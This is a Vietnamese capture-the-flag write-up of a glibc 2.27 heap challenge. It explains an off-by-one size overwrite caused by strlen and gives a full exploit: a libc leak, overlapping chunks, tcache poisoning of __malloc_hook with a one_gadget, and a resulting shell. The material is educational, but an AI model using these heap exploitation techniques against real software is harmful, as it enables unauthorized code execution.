

# Phân tích file.

- File 64bit và not stripped.

```wasm
unintended: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter ./lib/ld-2.27.so, for GNU/Linux 3.2.0, BuildID[sha1]=7bfb2bb322e2565ed3891924c6fd5daeca9bd5f1, not stripped
```

- Checksec:

```wasm
		Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  './lib'
```

- Các chức năng chính:

```wasm
Welcome to the RaRCTF 2021 Admin Panel!
This totally has effect on the actual challenges!
1. Make Challenge
2. Patch Challenge
3. Deploy Challenge
4. Take Down Challenge
5. Do nothing
>
```

- Có 5 chức năng chính như trên:
    - 1: Make challenge:

        ```c
        printf("Challenge number: ");
                __isoc99_scanf("%d", &size[1]);
                if ( size[1] > 9 || *((_QWORD *)&challenges + size[1]) )
                  goto LABEL_24;
                v4 = size[1];
                *((_QWORD *)&challenges + v4) = malloc(0x30uLL);
                printf("Challenge category: ");
                read(0, *((void **)&challenges + size[1]), 0x10uLL);
                printf("Challenge name: ");
                read(0, (void *)(*((_QWORD *)&challenges + size[1]) + 16LL), 0x10uLL);
                printf("Challenge description length: ");
                __isoc99_scanf("%d", size);
                v5 = *((_QWORD *)&challenges + size[1]);
                *(_QWORD *)(v5 + 32) = malloc(size[0]);
                printf("Challenge description: ");
                read(0, *(void **)(*((_QWORD *)&challenges + size[1]) + 32LL), size[0]);
                printf("Points: ");
                __isoc99_scanf("%d", *((_QWORD *)&challenges + size[1]) + 40LL);
                puts("Created challenge!");
                break;
        ```

        - Chương trình yêu cầu ta nhập challenge number và tối đa chỉ được 9 cái.
        - Sau đó sẽ malloc cố định cho ta 1 chunk có size 0x30.
        - Nhập category với size là 0x10.
        - Nhập name với size 0x10.
        - Nhập len và malloc 1 chunk mới với size đó.
        - Nhập description với size len trên.
        - Và nhập điểm.
        - Sau khi nhập nó như sau:
    - 2: Patch Challenge:

        ```c
        printf("Challenge number: ");
                __isoc99_scanf("%d", &size[1]);
                if ( size[1] > 9 || !*((_QWORD *)&challenges + size[1]) )
                  goto LABEL_24;
                if ( !strncmp("web", *((const char **)&challenges + size[1]), 3uLL) )
                {
                  printf("New challenge description: ");
                  v6 = strlen(*(const char **)(*((_QWORD *)&challenges + size[1]) + 32LL));
                  read(0, *(void **)(*((_QWORD *)&challenges + size[1]) + 32LL), v6);
                  puts("Patched challenge!");
                  ctftime_rating -= 5;
                }
                else
                {
                  puts("Challenge does not need patching, no unintended.");
                }
                break;
        ```

        - Input yêu cầu ta nhập challenge number, sau đó vào if so sánh 3 ký tự đầu category của challenge đã tạo ở trên với "web" nếu giống nhau sẽ cho thay đổi description. Nó lấy len là strlen() nên sẽ có 1 bug ở đây, strlen sẽ lấy độ dài của chuỗi đến khi gặp ký tự kết thúc, ta để ý nếu các thuộc tính của heap nó liền kề nhau thì ví dụ thuộc tính 1 có size 10 và thuộc tính 2 có size 1, ví dụ: aaaaaaaaaab0000000 thì strlen(thuộc tính 1) = 11 tính luôn đến khi gặp 0 hoặc xuống dòng. Ta ví dụ cụ thể như sau:

            ```c
            make(0,"web","a",0x28,"a"*0x28,1000)
            make(1,"web","b",0x70,"b"*0x70,1000)
            ```

            - Tạo 2 chunk với các thuộc tính như trên:

                ```c
                0x55555555d290: 0x0000000000000000      0x0000000000000031
                0x55555555d2a0: 0x6161616161616161      0x6161616161616161
                0x55555555d2b0: 0x6161616161616161      0x6161616161616161
                0x55555555d2c0: 0x6161616161616161      0x0000000000000041
                ```

                - Nếu ta lấy len(chuỗi a) thì sẽ không trả về 0x28 mà sẽ trả về 0x29 (bao gồm 0x41) vậy ta có thể edit được size của chunk tiếp theo.
        - 3. Deploy Challenge:

            ```c
            printf("Challenge number: ");
                    __isoc99_scanf("%d", &size[1]);
                    if ( size[1] > 9 || !*((_QWORD *)&challenges + size[1]) )
                      goto LABEL_24;
                    puts("Deploying...");
                    printf("Category: %s\n", *((const char **)&challenges + size[1]));
                    printf("Name: %s\n", (const char *)(*((_QWORD *)&challenges + size[1]) + 16LL));
                    printf("Description: %s\n", *(const char **)(*((_QWORD *)&challenges + size[1]) + 32LL));
                    break;
            ```

            - Đơn giản chỉ là show ra challenge được chỉ định.
        - 4. Take Down Challenge:

            ```c
            printf("Challenge number: ");
              __isoc99_scanf("%d", &size[1]);
            if ( size[1] <= 9 && *((_QWORD *)&challenges + size[1]) )
              {
                free(*(void **)(*((_QWORD *)&challenges + size[1]) + 32LL));
                free(*((void **)&challenges + size[1]));
                *((_QWORD *)&challenges + size[1]) = 0LL;
                ctftime_rating -= 3;
                if ( ctftime_rating <= 0 )
                {
                  puts("Well... great.");
                  exit(0);
                }
            ```

            - Hàm này free theo index, và có set con trỏ về 0 nên sẽ không có UAF.
        - Vậy ta có những bug nào:
            - Có thể edit size tiếp theo và hết.????? wtf ...

        # Exploit.

        ## Prepare:

        - Do chúng ta có thể control được size để malloc nên ta có thể cấp phát data unsorted bin hay tcache...
        - Sau khi có libc tính libc base, one_gadget, và địa chỉ của malloc_hook để overwrite.
        - Không double, không uaf vậy ta overwrite bằng cách nào, vì ta có thể control được size của chunk tiếp theo nên ta sẽ dùng overlapping_chunks để overwrite.

        ### Overlapping_chunks:

        - Nói nôm na là chunk này sẽ bao gồm chunk kia:

        ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d684425d-0d61-47cc-be1d-a41b67fc467e/Untitled.png)

        - Nếu ta edit toàn bộ chunk 1 thì chunk 2 sẽ edit theo, nếu edit chunk 2 thì 1 phần chunk 1 sẽ edit theo.
        - Giờ ví dụ để overwrite malloc hook thì ta cần overlapp chunk 1 lúc này chunk 1 bao gồm chunk 2, sau đó free chunk 2 thì data của chunk 2 sẽ là fd trong bin. Sau đó tính toán và edit chunk 1 sao cho tới phần data của chunk 2(fd) cho nó bằng địa chỉ của malloc_hook ⇒ Vậy là lúc này trong bin fd chunk 2 sẽ trỏ đến malloc hook nên ta có thể edit malloc_hook sau khi add thêm 2 chunk cùng size chunk 2.
    - Vậy để overlapping_chunks ta cần 3 chunk trong đó chunk 1 để ghi đè size chunk 2 đủ lớn để bao gồm cả chunk 3.

## War:

### Info leak:

- Ta chỉ cần malloc 1 size vượt quá tcache để vào unsorted bin sau đó free thì fd của nó sẽ là main arena + 98 sau đó tính libc_base ...

```c
add(0,'web','b',0x500,"a",1000)
add(1,'web','b',0x38,"a",1000)
add(2,'web','c',0x38,"a",1000)
free(0)
free(1)
free(2)
add(0,'web','b',0x500,"\xa0",1000)
add(1,'web','b',0x38,"a",1000)

deploy(0)
p.recvuntil('Description: ')
libc_base = u64(p.recv(6)+"\x00"*2) - 0x3ebca0
print "libc_base: ",hex(libc_base)

one = libc_base + 0x10a41c
_malloc_hook = libc_base + libc.symbols['__malloc_hook']
print "One: ",hex(one)
print "__malloc_hook: ",hex(_malloc_hook)
```

- Khi có các địa chỉ cần thiết ta cần chuẩn bị cho overlapping, ở đây mình có thêm 2 chunk với size 0x38 là vì khi free nó sẽ được đưa vào tcache 0x40 và như ta biết khi add() nó sẽ tạo cho ta 1 chunk cố định 0x30 (từ bin 0x40) và 1 chunk tự chọn size. Nên nếu làm bình thường khi add 3 chunk thì chunk 1 và 2 sẽ không liền kề nên ta không thể overwrite size được. Vì thế mình có add thêm 1 chunk với size 0x38 là khi free sẽ có sẵn trong bin 2 chunk 0x40.

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x55555555d000
Size: 0x251

Free chunk (tcache) | PREV_INUSE
Addr: 0x55555555d250
Size: 0x41
fd: 0x00

Allocated chunk | PREV_INUSE
Addr: 0x55555555d290
Size: 0x511

Allocated chunk | PREV_INUSE
Addr: 0x55555555d7a0
Size: 0x41

Free chunk (tcache) | PREV_INUSE
Addr: 0x55555555d7e0
Size: 0x41
fd: 0x55555555d260

Allocated chunk | PREV_INUSE
Addr: 0x55555555d820
Size: 0x41

Allocated chunk | PREV_INUSE
Addr: 0x55555555d860
Size: 0x41

Top chunk | PREV_INUSE
Addr: 0x55555555d8a0
Size: 0x20761
```

- Vậy giờ khi ta add() 3 chunk mới thì chunk 1 và 2 sẽ liền kề.

```c
add(3,'web','b',0x4f8,"a"*0x4f8,1000)
add(4,'web','c',0x4f8,"c"*0x4f8,1000)
add(5,'web','d',0x78,"b"*0x78,1000)
```

```c
Allocated chunk | PREV_INUSE
Addr: 0x55555555d8a0
Size: 0x501

Allocated chunk | PREV_INUSE
Addr: 0x55555555dda0
Size: 0x501

Allocated chunk | PREV_INUSE
Addr: 0x55555555e2a0
Size: 0x41

Allocated chunk | PREV_INUSE
Addr: 0x55555555e2e0
Size: 0x81

Top chunk | PREV_INUSE
Addr: 0x55555555e360
Size: 0x1fca1
```

- Vậy là khi ta free chunk 4 ta có thể overwirte size chunk 4 bằng cách patch chunk 3 và lừa chương trình rằng chunk 4 có size để cấp phát lớn hơn so với mặc định.

```c
free(4)
patch(3,b"c"*0x4f8+p16(0x581))
free(5)
```

- Mình overwrite size chunk 4 thành 0x581 đủ để bao gồm chunk 5, sau đó free chunk 5 để edit fd.
- Trước khi overwirte size chunk 4:

```c
Allocated chunk | PREV_INUSE
Addr: 0x55555555d8a0
Size: 0x501

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555dda0
Size: 0x501
fd: 0x7ffff7dcdca0
bk: 0x7ffff7dcdca0

Allocated chunk
Addr: 0x55555555e2a0
Size: 0x40

Allocated chunk | PREV_INUSE
Addr: 0x55555555e2e0
Size: 0x81

Top chunk | PREV_INUSE
Addr: 0x55555555e360
Size: 0x1fca1
```

- Sau khi overwrite:

```c
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55555555dda0
Size: 0x581
fd: 0x7ffff7dcdca0
bk: 0x7ffff7dcdca0

Allocated chunk | IS_MMAPED
Addr: 0x55555555e320
Size: 0x6262626262626262
```

- Vậy giờ ta yêu cầu malloc 1 size 0x578 thì nó sẽ dùng chunk 4 đó malloc.

```c
pwndbg> p/x 0x55555555e2f0-0x55555555ddb0
$2 = 0x540
```

- Tính toán offset để đến fd của chunk 5.

```c
add(4,'web','b',0x578,"c"*0x540+p64(_malloc_hook),1000)
add(5,'web','d',0x78,"b"*0x78,1000)
add(6,'web','d',0x78,p64(one),1000)
```

- Với dòng đầu tiên ta có thể overwrite fd của chunk 5 thành malloc hook.

```c
pwndbg> bin
tcachebins
0x40 [  1]: 0x55555555d260 ◂— 0x0
0x80 [  1]: 0x55555555e2f0 —▸ 0x7ffff7dcdc30 (__malloc_hook) ◂— ...
```

- Giờ ta chỉ cần add thêm 1 chunk size 0x78 thì trong bin chỉ còn malloc hook, add thêm lần nữa là malloc cho __malloc_hook lúc này ghi data là one_gadget thì ta sẽ overwrite được __malloc_hook thành one_gadget.

```c
pwndbg> x/xg 0x7ffff7dcdc30
0x7ffff7dcdc30 <__malloc_hook>: 0x00007ffff7aec41c //one_gadget
```

- Vậy là thành công giờ ta malloc sẽ có được shell.

```c
[*] Switching to interactive mode
Created challenge!
1. Make Challenge
2. Patch Challenge
3. Deploy Challenge
4. Take Down Challenge
5. Do nothing
> Challenge number: $
$ w
 10:54:26 up  1:29,  0 users,  load average: 0.07, 0.02, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
$
```
